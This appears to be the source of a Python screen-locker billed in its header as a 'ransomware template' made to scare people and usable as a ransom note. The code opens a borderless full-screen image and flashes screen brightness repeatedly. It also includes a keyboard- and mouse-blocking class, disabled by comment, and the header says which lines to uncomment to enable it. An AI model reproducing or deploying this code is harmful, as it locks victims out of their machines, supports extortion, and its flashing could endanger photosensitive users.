"""
 $$$$$$$$$$$$$$$$$$$$$$$
 $ RaNsOmWaRe TeMpLaTe $
 $   -- Br4v3H3r0 --   $
 $$$$$$$$$$$$$$$$$$$$$$$   

 # Made to scare the sh*t out of people
 # can be used as a ransom note template


 -> install dependencies and run using python3
 -> once run it will show a full screen image and block inputs
 -> control screen brightness and create flashes to scare user
 
 (Blocking Inputs is disabled by deafult)
 To enable - (uncomment lines 42-45 and 116-118)

 Testing - 
 
 -> set a image of your choice on line 120
 -> Run python3 screen_lock.py
 -> Screen will pop the image 

 To end program -
 -> press ctrl+alt+F1 and login
 -> execute the command "ps aux | grep python"
 -> note the pid of the process running 
 -> execute the command "kill -9 <pid you noted>"
 -> press ctrl+alt+F7 and you're back!

""" 

import sys
import tkinter
from PIL import Image, ImageTk
from threading import Timer
from time import sleep

# import pyHook   ## Libraries to block inputs (uncomment to enable)
# import win32gui
# import logging
# import win32file

import screen_brightness_control as sbc 
from time import sleep  

def FULL_BRIGHT():
    current_brightness = sbc.get_brightness() 
    if current_brightness==100:
        pass
    else:   
        sbc.set_brightness(100) 

def brightness_setter(num,sleep_time):
    sbc.set_brightness(num)
    sleep(sleep_time)

def FLASHER(num):
    for i in range(num):
        brightness_setter(0,0.5)
        brightness_setter(100,0.5)

def showPIL(pilImage):
    root = tkinter.Tk()
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    root.overrideredirect(1)
    root.geometry("%dx%d+0+0" % (w, h))
    root.focus_set()    
    canvas = tkinter.Canvas(root,width=w,height=h)
    canvas.pack()
    canvas.configure(background='black')
    imgWidth, imgHeight = pilImage.size
    if imgWidth > w or imgHeight > h:
        ratio = min(w/imgWidth, h/imgHeight)
        imgWidth = int(imgWidth*ratio)
        imgHeight = int(imgHeight*ratio)
        pilImage = pilImage.resize((imgWidth,imgHeight), Image.ANTIALIAS)
    image = ImageTk.PhotoImage(pilImage)
    imagesprite = canvas.create_image(w/2,h/2,image=image)
    root.mainloop()


class blockInput():

    def __init__(self):
        self.hm = pyHook.HookManager()

    def OnKeyboardEvent(self,event):
        return False

    def OnMouseEvent(self,event):
        return False

    def unblock(self):

        try: self.hm.UnhookKeyboard()
        except: pass
        try: self.hm.UnhookMouse()
        except: pass

    def block(self ,keyboard = True, mouse = True):
    
        while(1):
            if mouse:
                  self.hm.MouseAll = self.OnMouseEvent
                  self.hm.HookMouse()
            if keyboard:
                  self.hm.KeyAll = self.OnKeyboardEvent
                  self.hm.HookKeyboard()
            win32gui.PumpWaitingMessages()
            

# block = blockInput()  ## To Block Inputs (uncomment to enable)
# block.block()
# block.unblock()

pilImage = Image.open("img.jpg")
showPIL(pilImage)

FULL_BRIGHT()
FLASHER(3)
